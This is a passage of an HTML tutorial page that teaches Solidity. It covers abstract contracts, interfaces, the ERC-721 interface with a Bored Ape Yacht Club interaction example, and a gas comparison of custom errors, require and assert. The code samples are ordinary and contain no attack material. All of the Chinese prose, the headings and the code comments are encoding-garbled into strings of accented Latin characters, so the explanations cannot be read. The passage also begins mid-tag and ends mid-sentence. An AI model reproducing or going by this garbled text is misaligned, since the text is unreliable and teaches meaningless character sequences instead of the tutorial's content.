href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=%E7%BB%A7%E6%89%BF#index-16">Solidityçš„å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126223941045.png" alt="image-20250126223941045"></p><h2 id="æŠ½è±¡åˆçº¦å’Œæ¥å£">æŠ½è±¡åˆçº¦å’Œæ¥å£</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ç”¨<code>ERC721</code>çš„æ¥å£åˆçº¦ä¸ºä¾‹ä»‹ç»<code>Solidity</code>ä¸­çš„æŠ½è±¡åˆçº¦ï¼ˆ<code>abstract</code>ï¼‰å’Œæ¥å£ï¼ˆ<code>interface</code>ï¼‰ï¼Œå¸®åŠ©å¤§å®¶æ›´å¥½çš„ç†è§£<code>ERC721</code>æ ‡å‡†ã€‚</p><p><code>ERC-721</code>æ˜¯ä»¥å¤ªåŠç½‘ç»œä¸Šç”¨äº<strong>å®ç°éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰çš„æ ‡å‡†ã€‚å®ƒå®šä¹‰äº†ä¸€ç»„è§„åˆ™ï¼Œå…è®¸åˆ›å»ºå…·æœ‰å”¯ä¸€æ€§çš„æ•°å­—èµ„äº§æˆ–ä»£å¸ã€‚ä¸ERC-20æ ‡å‡†çš„åŒè´¨åŒ–ä»£å¸ä¸åŒ</strong>ï¼Œ<code>ERC-721</code>ä»£å¸æ¯ä¸€ä¸ªéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œå¯ä»¥ç”¨æ¥è¡¨ç¤ºè‰ºæœ¯ä½œå“ã€æ”¶è—å“ã€æ¸¸æˆé“å…·ã€æˆ¿åœ°äº§ç­‰ç‹¬ç‰¹çš„èµ„äº§ã€‚</p><h3 id="æŠ½è±¡åˆçº¦">æŠ½è±¡åˆçº¦</h3><p>å¦‚æœä¸€ä¸ªæ™ºèƒ½åˆçº¦é‡Œè‡³å°‘æœ‰ä¸€ä¸ªæœªå®ç°çš„å‡½æ•°ï¼Œå³æŸä¸ªå‡½æ•°ç¼ºå°‘ä¸»ä½“<code>&#123;&#125;</code>ä¸­çš„å†…å®¹ï¼Œåˆ™å¿…é¡»å°†è¯¥åˆçº¦æ ‡ä¸º<code>abstract</code>ï¼Œä¸ç„¶ç¼–è¯‘ä¼šæŠ¥é”™ï¼›å¦å¤–ï¼Œæœªå®ç°çš„å‡½æ•°éœ€è¦åŠ <code>virtual</code>ï¼Œä»¥ä¾¿å­åˆçº¦é‡å†™ã€‚å¦‚æœæˆ‘ä»¬è¿˜æ²¡æƒ³å¥½å…·ä½“æ€ä¹ˆå®ç°æŸä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠåˆçº¦æ ‡ä¸º<code>abstract</code>ï¼Œä¹‹åè®©åˆ«äººè¡¥å†™ä¸Šã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InsertionSort&#123;</span><br><span class="line">    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æŠ½è±¡åˆçº¦çš„ä»£ç <code>Abstract.sol</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">abstract contract Base&#123;</span><br><span class="line">    string public name = &quot;Base&quot;;</span><br><span class="line">    function getAlias() public pure virtual returns(string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getAlias() public pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;BaseImpl&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127032832688.png" alt="image-20250127032832688"></p><h3 id="æ¥å£">æ¥å£</h3><p>æ¥å£ç±»ä¼¼äºæŠ½è±¡åˆçº¦ï¼Œä½†å®ƒä¸å®ç°ä»»ä½•åŠŸèƒ½ã€‚æ¥å£çš„è§„åˆ™ï¼š</p><ol><li><strong>ä¸èƒ½åŒ…å«çŠ¶æ€å˜é‡</strong></li><li><strong>ä¸èƒ½åŒ…å«æ„é€ å‡½æ•°</strong></li><li><strong>ä¸èƒ½ç»§æ‰¿é™¤æ¥å£å¤–çš„å…¶ä»–åˆçº¦</strong></li><li><strong>æ‰€æœ‰å‡½æ•°éƒ½å¿…é¡»æ˜¯externalä¸”ä¸èƒ½æœ‰å‡½æ•°ä½“</strong></li><li><strong>ç»§æ‰¿æ¥å£çš„éæŠ½è±¡åˆçº¦å¿…é¡»å®ç°æ¥å£å®šä¹‰çš„æ‰€æœ‰åŠŸèƒ½</strong></li></ol><p>è™½ç„¶æ¥å£ä¸å®ç°ä»»ä½•åŠŸèƒ½ï¼Œä½†å®ƒéå¸¸é‡è¦ã€‚æ¥å£æ˜¯æ™ºèƒ½åˆçº¦çš„éª¨æ¶ï¼Œå®šä¹‰äº†åˆçº¦çš„åŠŸèƒ½ä»¥åŠå¦‚ä½•è§¦å‘å®ƒä»¬ã€‚</p><p>å¦‚æœæ™ºèƒ½åˆçº¦å®ç°äº†æŸç§æ¥å£ï¼ˆæ¯”å¦‚<code>ERC20</code>æˆ–<code>ERC721</code>ï¼‰ï¼Œå…¶ä»–Dappså’Œæ™ºèƒ½åˆçº¦å°±çŸ¥é“å¦‚ä½•ä¸å®ƒäº¤äº’ã€‚</p><p>å› ä¸ºæ¥å£æä¾›äº†ä¸¤ä¸ªé‡è¦çš„ä¿¡æ¯ï¼š</p><ol><li>åˆçº¦é‡Œæ¯ä¸ªå‡½æ•°çš„<code>bytes4</code>é€‰æ‹©å™¨ï¼Œä»¥åŠå‡½æ•°ç­¾å<code>å‡½æ•°å(æ¯ä¸ªå‚æ•°ç±»å‹ï¼‰</code>ã€‚</li><li>æ¥å£idï¼ˆæ›´å¤šä¿¡æ¯è§<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>ï¼‰</li></ol><p>å¦å¤–ï¼Œæ¥å£ä¸åˆçº¦<code>ABI</code>ï¼ˆApplication Binary Interfaceï¼‰ç­‰ä»·ï¼Œå¯ä»¥ç›¸äº’è½¬æ¢ï¼šç¼–è¯‘æ¥å£å¯ä»¥å¾—åˆ°åˆçº¦çš„<code>ABI</code>ï¼Œåˆ©ç”¨<a href="https://gnidan.github.io/abi-to-sol/">abi-to-solå·¥å…·</a>ï¼Œä¹Ÿå¯ä»¥å°†<code>ABI json</code>æ–‡ä»¶è½¬æ¢ä¸º<code>æ¥å£sol</code>æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬ä»¥<code>ERC721</code>æ¥å£åˆçº¦<code>IERC721</code>ä¸ºä¾‹ï¼Œå®ƒå®šä¹‰äº†3ä¸ª<code>event</code>å’Œ9ä¸ª<code>function</code>ï¼Œæ‰€æœ‰<code>ERC721</code>æ ‡å‡†çš„NFTéƒ½å®ç°äº†è¿™äº›å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¥å£å’Œå¸¸è§„åˆçº¦çš„åŒºåˆ«åœ¨äºæ¯ä¸ªå‡½æ•°éƒ½ä»¥<code>;</code>ä»£æ›¿å‡½æ•°ä½“<code>&#123; &#125;</code>ç»“å°¾ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æ¥å£çš„ä»£ç <code>Interface.sol</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">interface Base&#123;</span><br><span class="line">    function getFirstName() external pure returns (string memory);</span><br><span class="line">    function getLastName() external pure returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getFirstName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Amazing&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function getLastName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Ang&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127121544577.png" alt="image-20250127121544577"></p><h3 id="IERC721äº‹ä»¶">IERC721äº‹ä»¶</h3><p><code>IERC721</code>åŒ…å«3ä¸ªäº‹ä»¶ï¼Œå…¶ä¸­<code>Transfer</code>å’Œ<code>Approval</code>äº‹ä»¶åœ¨<code>ERC20</code>ä¸­ä¹Ÿæœ‰ã€‚</p><ul><li><code>Transfer</code>äº‹ä»¶ï¼šåœ¨è½¬è´¦æ—¶è¢«é‡Šæ”¾ï¼Œè®°å½•ä»£å¸çš„å‘å‡ºåœ°å€<code>from</code>ï¼Œæ¥æ”¶åœ°å€<code>to</code>å’Œ<code>tokenId</code>ã€‚</li><li><code>Approval</code>äº‹ä»¶ï¼šåœ¨æˆæƒæ—¶è¢«é‡Šæ”¾ï¼Œè®°å½•æˆæƒåœ°å€<code>owner</code>ï¼Œè¢«æˆæƒåœ°å€<code>approved</code>å’Œ<code>tokenId</code>ã€‚</li><li><code>ApprovalForAll</code>äº‹ä»¶ï¼šåœ¨æ‰¹é‡æˆæƒæ—¶è¢«é‡Šæ”¾ï¼Œè®°å½•æ‰¹é‡æˆæƒçš„å‘å‡ºåœ°å€<code>owner</code>ï¼Œè¢«æˆæƒåœ°å€<code>operator</code>å’Œæˆæƒä¸å¦çš„<code>approved</code>ã€‚</li></ul><h3 id="IERC721å‡½æ•°">IERC721å‡½æ•°</h3><ul><li><code>balanceOf</code>ï¼šè¿”å›æŸåœ°å€çš„NFTæŒæœ‰é‡<code>balance</code>ã€‚</li><li><code>ownerOf</code>ï¼šè¿”å›æŸ<code>tokenId</code>çš„ä¸»äºº<code>owner</code>ã€‚</li><li><code>transferFrom</code>ï¼šæ™®é€šè½¬è´¦ï¼Œå‚æ•°ä¸ºè½¬å‡ºåœ°å€<code>from</code>ï¼Œæ¥æ”¶åœ°å€<code>to</code>å’Œ<code>tokenId</code>ã€‚</li><li><code>safeTransferFrom</code>ï¼šå®‰å…¨è½¬è´¦ï¼ˆå¦‚æœæ¥æ”¶æ–¹æ˜¯åˆçº¦åœ°å€ï¼Œä¼šè¦æ±‚å®ç°<code>ERC721Receiver</code>æ¥å£ï¼‰ã€‚å‚æ•°ä¸ºè½¬å‡ºåœ°å€<code>from</code>ï¼Œæ¥æ”¶åœ°å€<code>to</code>å’Œ<code>tokenId</code>ã€‚</li><li><code>approve</code>ï¼šæˆæƒå¦ä¸€ä¸ªåœ°å€ä½¿ç”¨ä½ çš„NFTã€‚å‚æ•°ä¸ºè¢«æˆæƒåœ°å€<code>approve</code>å’Œ<code>tokenId</code>ã€‚</li><li><code>getApproved</code>ï¼šæŸ¥è¯¢<code>tokenId</code>è¢«æ‰¹å‡†ç»™äº†å“ªä¸ªåœ°å€ã€‚</li><li><code>setApprovalForAll</code>ï¼šå°†è‡ªå·±æŒæœ‰çš„è¯¥ç³»åˆ—NFTæ‰¹é‡æˆæƒç»™æŸä¸ªåœ°å€<code>operator</code>ã€‚</li><li><code>isApprovedForAll</code>ï¼šæŸ¥è¯¢æŸåœ°å€çš„NFTæ˜¯å¦æ‰¹é‡æˆæƒç»™äº†å¦ä¸€ä¸ª<code>operator</code>åœ°å€ã€‚</li><li><code>safeTransferFrom</code>ï¼šå®‰å…¨è½¬è´¦çš„é‡è½½å‡½æ•°ï¼Œå‚æ•°é‡Œé¢åŒ…å«äº†<code>data</code>ã€‚</li></ul><h3 id="ä»€ä¹ˆæ—¶å€™ä½¿ç”¨æ¥å£ï¼Ÿ">ä»€ä¹ˆæ—¶å€™ä½¿ç”¨æ¥å£ï¼Ÿ</h3><p>å¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªåˆçº¦å®ç°äº†<code>IERC721</code>æ¥å£ï¼Œæˆ‘ä»¬ä¸éœ€è¦çŸ¥é“å®ƒå…·ä½“ä»£ç å®ç°ï¼Œå°±å¯ä»¥ä¸å®ƒäº¤äº’ã€‚</p><p>æ— èŠçŒ¿<code>BAYC</code>å±äº<code>ERC721</code>ä»£å¸ï¼Œå®ç°äº†<code>IERC721</code>æ¥å£çš„åŠŸèƒ½ã€‚æˆ‘ä»¬ä¸éœ€è¦çŸ¥é“å®ƒçš„æºä»£ç ï¼Œåªéœ€çŸ¥é“å®ƒçš„åˆçº¦åœ°å€ï¼Œç”¨<code>IERC721</code>æ¥å£å°±å¯ä»¥ä¸å®ƒäº¤äº’ï¼Œæ¯”å¦‚ç”¨<code>balanceOf()</code>æ¥æŸ¥è¯¢æŸä¸ªåœ°å€çš„<code>BAYC</code>ä½™é¢ï¼Œç”¨<code>safeTransferFrom()</code>æ¥è½¬è´¦<code>BAYC</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract interactBAYC &#123;</span><br><span class="line">    // åˆ©ç”¨BAYCåœ°å€åˆ›å»ºæ¥å£åˆçº¦å˜é‡ï¼ˆETHä¸»ç½‘ï¼‰</span><br><span class="line">    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);</span><br><span class="line"></span><br><span class="line">    // é€šè¿‡æ¥å£è°ƒç”¨BAYCçš„balanceOf()æŸ¥è¯¢æŒä»“é‡</span><br><span class="line">    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;</span><br><span class="line">        return BAYC.balanceOf(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // é€šè¿‡æ¥å£è°ƒç”¨BAYCçš„safeTransferFrom()å®‰å…¨è½¬è´¦</span><br><span class="line">    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;</span><br><span class="line">        BAYC.safeTransferFrom(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¼‚å¸¸">å¼‚å¸¸</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ä»‹ç»<code>Solidity</code>ä¸‰ç§æŠ›å‡ºå¼‚å¸¸çš„æ–¹æ³•ï¼š<code>error</code>ï¼Œ<code>require</code>å’Œ<code>assert</code>ï¼Œå¹¶æ¯”è¾ƒä¸‰ç§æ–¹æ³•çš„<code>gas</code>æ¶ˆè€—ã€‚</p><h3 id="å¼‚å¸¸-2">å¼‚å¸¸</h3><p>å†™æ™ºèƒ½åˆçº¦ç»å¸¸ä¼šå‡º<code>bug</code>ï¼Œ<code>Solidity</code>ä¸­çš„å¼‚å¸¸å‘½ä»¤å¸®åŠ©æˆ‘ä»¬<code>debug</code>ã€‚</p><p>æµ‹è¯•ä»£ç <code>Error.sol</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// Gas coståœ¨Remixä¸­æµ‹è¯•å¾—åˆ° ä½¿ç”¨0.8.26ç‰ˆæœ¬ç¼–è¯‘</span><br><span class="line">// å‚æ•°ä½¿ç”¨ tokenId = 123, address = &#123;any address&#125;</span><br><span class="line"></span><br><span class="line">// è‡ªå®šä¹‰error</span><br><span class="line">//error TransferNotOwner();</span><br><span class="line"></span><br><span class="line">error TransferNotOwner(address sender);</span><br><span class="line"></span><br><span class="line">contract Errors &#123;</span><br><span class="line">    // ä¸€ç»„æ˜ å°„ï¼Œè®°å½•æ¯ä¸ªTokenIdçš„Owner</span><br><span class="line">    mapping(uint256 =&gt; address) private _owners;</span><br><span class="line"></span><br><span class="line">    // Erroræ–¹æ³•: gas cost 24095</span><br><span class="line">    // Erroræ–¹æ³•: gas cost 24113</span><br><span class="line">    function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        if (_owners[tokenId] != msg.sender) &#123;</span><br><span class="line">            //revert TransferNotOwner();</span><br><span class="line">            revert TransferNotOwner(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // requireæ–¹æ³•: gas cost 24211</span><br><span class="line">    function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // assertæ–¹æ³•: gas cost 24109</span><br><span class="line">    function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        assert(_owners[tokenId] == msg.sender);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Error">Error</h3><p><code>error</code>æ˜¯<code>solidity 0.8.4ç‰ˆæœ¬</code>æ–°åŠ çš„å†…å®¹ï¼Œæ–¹ä¾¿ä¸”é«˜æ•ˆï¼ˆçœ<code>gas</code>ï¼‰åœ°å‘ç”¨æˆ·è§£é‡Šæ“ä½œå¤±è´¥çš„åŸå› ï¼ŒåŒæ—¶è¿˜å¯ä»¥åœ¨æŠ›å‡ºå¼‚å¸¸çš„åŒæ—¶æºå¸¦å‚æ•°ï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°è°ƒè¯•ã€‚äººä»¬å¯ä»¥åœ¨<code>contract</code>ä¹‹å¤–å®šä¹‰å¼‚å¸¸ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ª<code>TransferNotOwner</code>å¼‚å¸¸ï¼Œå½“ç”¨æˆ·ä¸æ˜¯ä»£å¸<code>owner</code>çš„æ—¶å€™å°è¯•è½¬è´¦ï¼Œä¼šæŠ›å‡ºé”™è¯¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); // è‡ªå®šä¹‰error</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å®šä¹‰ä¸€ä¸ªæºå¸¦å‚æ•°çš„å¼‚å¸¸ï¼Œæ¥æç¤ºå°è¯•è½¬è´¦çš„è´¦æˆ·åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // è‡ªå®šä¹‰çš„å¸¦å‚æ•°çš„error</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œå½“ä¸­ï¼Œ<code>error</code>å¿…é¡»æ­é…<code>revert</code>ï¼ˆå›é€€ï¼‰å‘½ä»¤ä½¿ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    if(_owners[tokenId] != msg.sender)&#123;</span><br><span class="line">        revert TransferNotOwner();</span><br><span class="line">        // revert TransferNotOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª<code>transferOwner1()</code>å‡½æ•°ï¼Œå®ƒä¼šæ£€æŸ¥ä»£å¸çš„<code>owner</code>æ˜¯ä¸æ˜¯å‘èµ·äººï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¼šæŠ›å‡º<code>TransferNotOwner</code>å¼‚å¸¸ï¼›å¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¼šè½¬è´¦ã€‚</p><p>ä¸å¸¦å‚æ•°çš„<code>error</code>ï¼Œæ¶ˆè€—<code>gas</code>é‡ä¸º<code>24095</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127123837474.png" alt="image-20250127123837474"></p><p>å¸¦å‚æ•°çš„<code>error</code>ï¼Œæ¶ˆè€—<code>gas</code>é‡ä¸º<code>24113</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127124300009.png" alt="image-20250127124300009"></p><h3 id="Require">Require</h3><p><code>require</code>å‘½ä»¤æ˜¯<code>solidity 0.8ç‰ˆæœ¬</code>ä¹‹å‰æŠ›å‡ºå¼‚å¸¸çš„å¸¸ç”¨æ–¹æ³•ï¼Œç›®å‰å¾ˆå¤šä¸»æµåˆçº¦ä»ç„¶è¿˜åœ¨ä½¿ç”¨å®ƒã€‚å®ƒå¾ˆå¥½ç”¨ï¼Œå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯<code>gas</code>éšç€æè¿°å¼‚å¸¸çš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ ï¼Œæ¯”<code>error</code>å‘½ä»¤è¦é«˜ã€‚ä½¿ç”¨æ–¹æ³•ï¼š<code>require(æ£€æŸ¥æ¡ä»¶ï¼Œ&quot;å¼‚å¸¸çš„æè¿°&quot;)</code>ï¼Œ<strong>å½“æ£€æŸ¥æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</strong></p><p>æˆ‘ä»¬ç”¨<code>require</code>å‘½ä»¤é‡å†™ä¸€ä¸‹ä¸Šé¢çš„<code>transferOwner1</code>å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>require</code>æ¶ˆè€—<code>gas</code>çš„é‡ä¸º<code>24211</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127125601300.png" alt="image-20250127125601300"></p><h3 id="Assert">Assert</h3><p><code>assert</code>å‘½ä»¤ä¸€èˆ¬ç”¨äºç¨‹åºå‘˜å†™ç¨‹åº<code>debug</code>ï¼Œå› ä¸ºå®ƒä¸èƒ½è§£é‡ŠæŠ›å‡ºå¼‚å¸¸çš„åŸå› ï¼ˆæ¯”<code>require</code>å°‘ä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚å®ƒçš„ç”¨æ³•å¾ˆç®€å•ï¼Œ<code>assert(æ£€æŸ¥æ¡ä»¶ï¼‰</code>ï¼Œ<strong>å½“æ£€æŸ¥æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</strong></p><p>æˆ‘ä»¬ç”¨<code>assert</code>å‘½ä»¤é‡å†™ä¸€ä¸‹ä¸Šé¢çš„<code>transferOwner1</code>å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    assert(_owners[tokenId] == msg.sender);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>assert</code>æ¶ˆè€—<code>gas</code>çš„é‡ä¸º<code>24109</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127130047597.png" alt="image-20250127130047597"></p><h3 id="ä¸‰ç§æ–¹æ³•çš„gasæ¯”è¾ƒ">ä¸‰ç§æ–¹æ³•çš„gasæ¯”è¾ƒ</h3><p>æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹ä¸‰ç§æŠ›å‡ºå¼‚å¸¸çš„<code>gas</code>æ¶ˆè€—ï¼ŒæŸ¥è¯¢<code>gas</code>çš„æ¶ˆè€— ï¼ˆä½¿ç”¨0.8.26ç‰ˆæœ¬ç¼–è¯‘ï¼‰</p><ol><li><code>error</code>æ–¹æ³•<code>gas</code>æ¶ˆè€—ï¼š24095 (åŠ å…¥å‚æ•°å<code>gas</code>æ¶ˆè€—ï¼š24113)</li><li><code>require</code>æ–¹æ³•<code>gas</code>æ¶ˆè€—ï¼š24211</li><li><code>assert</code>æ–¹æ³•<code>gas</code>æ¶ˆè€—ï¼š24109</li></ol><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>error</code>æ–¹æ³•<code>gas</code>æœ€å°‘ï¼Œå…¶æ¬¡æ˜¯<code>assert</code>ï¼Œ<code>require</code>æ–¹æ³•æ¶ˆè€—<code>gas</code>æœ€å¤šï¼å› æ­¤ï¼Œ<code>error</code>æ—¢å¯ä»¥å‘ŠçŸ¥ç”¨æˆ·æŠ›å‡ºå¼‚å¸¸çš„åŸå› 